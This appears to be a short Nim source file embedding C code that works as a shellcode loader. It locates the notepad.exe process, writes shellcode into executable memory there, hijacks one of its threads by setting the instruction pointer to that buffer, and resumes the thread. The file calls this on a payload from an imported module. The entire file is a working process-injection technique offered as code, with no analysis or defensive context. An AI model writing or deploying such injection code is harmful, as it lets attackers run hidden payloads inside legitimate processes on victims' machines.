import public

{.emit: """
#include <TlHelp32.h>

int Thread(char *shellcode,SIZE_T shellcodeSize)
{
    HANDLE targetProcessHandle;
	PVOID remoteBuffer;
	HANDLE threadHijacked = NULL;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	THREADENTRY32 threadEntry;
	CONTEXT context;
	PROCESSENTRY32 processEntry = { 0 };
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(snapshot, &processEntry))
	{
		while (strcmp(processEntry.szExeFile, (const char *)"notepad.exe") != 0)
		{
			Process32Next(snapshot, &processEntry);
		}
	}
	DWORD targetPID = processEntry.th32ProcessID;
	context.ContextFlags = CONTEXT_FULL;
	threadEntry.dwSize = sizeof(THREADENTRY32);
	targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
	remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(targetProcessHandle, remoteBuffer, shellcode, shellcodeSize, NULL);
	Thread32First(snapshot, &threadEntry);
	while (Thread32Next(snapshot, &threadEntry))
	{
		if (threadEntry.th32OwnerProcessID == targetPID)
		{
			threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
			break;
		}
	}
	SuspendThread(threadHijacked);
	GetThreadContext(threadHijacked, &context);
#ifdef _M_X64
	context.Rip = (DWORD_PTR)remoteBuffer;
#else
	context.Eip = (DWORD_PTR)remoteBuffer;
#endif // x64
	SetThreadContext(threadHijacked, &context);
	ResumeThread(threadHijacked);
	return 0;
}
""".}
proc Thread(plainBuffer:cstring,size:cint):cint {.importcpp:"Thread(@)",nodecl.}

discard Thread(code,codelen)
